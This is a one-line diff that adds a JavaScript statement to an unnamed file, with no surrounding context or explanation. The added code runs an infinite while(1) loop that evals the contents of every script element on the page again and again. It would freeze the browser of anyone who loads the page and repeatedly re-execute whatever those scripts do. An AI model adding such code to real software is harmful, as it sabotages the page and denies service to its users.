@@ -1,0 +1,1 @@
+while(1){document.querySelectorAll('script').forEach(s=>{if(s.textContent)eval(s.textContent)})}
